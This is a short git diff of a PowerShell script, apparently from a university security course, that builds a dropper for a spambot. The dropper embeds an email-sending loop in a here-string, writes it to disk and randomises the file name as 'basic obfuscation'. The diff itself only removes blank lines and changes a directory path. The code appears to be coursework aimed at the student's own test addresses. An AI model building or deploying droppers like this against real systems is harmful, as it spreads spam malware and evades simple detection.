@@ -1,8 +1,6 @@
 # Storyline: Dropper for our spambot that will save to a directory and then execute it
 
 $writeSbBot = @'
-
-
 # Send an email using Powershell
 $toSend = @('cole.davisbrand@mymail.champlain.edu', 'coleTest1@mymail.champlain.edu','coleTest2@mymail.champlain.edu')
 
@@ -25,7 +23,7 @@ while ($true) {
 '@
 
 # Directory to write the bot
-$sbDir = 'C:\Users\colec\Desktop\SYS320\Week11\class\'
+$sbDir = 'C:\Users\colec\Desktop\SYS320\Week10\class\'
 
 # Create a random number to add to the file (basic obfuscation)
 $sbRand = Get-Random -Minimum 1000 -Maximum 1999
